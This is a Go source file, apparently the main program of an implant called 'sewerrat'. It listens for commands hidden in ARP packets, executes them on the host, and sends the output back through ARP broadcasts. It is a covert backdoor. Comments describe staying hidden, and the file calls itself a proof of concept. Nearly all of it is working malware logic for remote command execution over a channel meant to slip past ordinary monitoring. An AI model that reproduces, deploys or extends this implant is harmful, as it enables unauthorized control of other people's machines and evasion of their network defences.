package main

import (
	"log"
	"os"
	"os/signal"
	"syscall"

	"sewerrat/implant"
	"sewerrat/shared"
)

func main() {
	// Suppress console output to stay hidden (Windows)
	// This is a PoC; in production use, silence wouldn't need to log at all
	log.SetOutput(os.Stderr) // At least direct to stderr

	// Step 1: Find active network interface
	iface, err := implant.FindActiveInterface()
	if err != nil {
		log.Fatalf("[!] %v\n", err)
	}
	log.Printf("[*] Found interface: %s (%s)\n", iface.Name, iface.HardwareAddr)

	// Step 2: Create ARP sniffer
	sniffer, err := implant.NewARPSniffer(iface)
	if err != nil {
		log.Fatalf("[!] Failed to create sniffer: %v\n", err)
	}
	defer sniffer.Stop()

	// Step 3: Create broadcaster for responses
	broadcaster := implant.NewARPBroadcaster(iface)
	broadcaster.Handle, _ = iface.GetDeviceHandle()
	defer broadcaster.Close()

	// Step 4: Create executor for commands
	executor := implant.NewCommandExecutor(shared.CommandTimeout)

	// Step 5: Start sniffer in background
	if err := sniffer.StartAsync(); err != nil {
		log.Fatalf("[!] Failed to start sniffer: %v\n", err)
	}

	log.Printf("[+] Beacon active on %s\n", iface.IP)

	// Step 6: Send initial beacon (optional, for testing)
	_ = broadcaster.SendBeacon()

	// Step 7: Main command loop - listen for commands and execute
	commandCh := sniffer.GetCommandChannel()
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)

	for {
		select {
		case command := <-commandCh:
			// Execute command
			log.Printf("[*] Executing: %s\n", command)
			output, err := executor.Execute(command)
			if err != nil {
				output = "[ERROR] " + err.Error()
			}

			// Send response via ARP
			_ = broadcaster.SendResponse(output)

		case <-sigCh:
			// Graceful shutdown on Ctrl+C or SIGTERM
			log.Printf("[*] Shutting down...\n")
			return
		}
	}
}
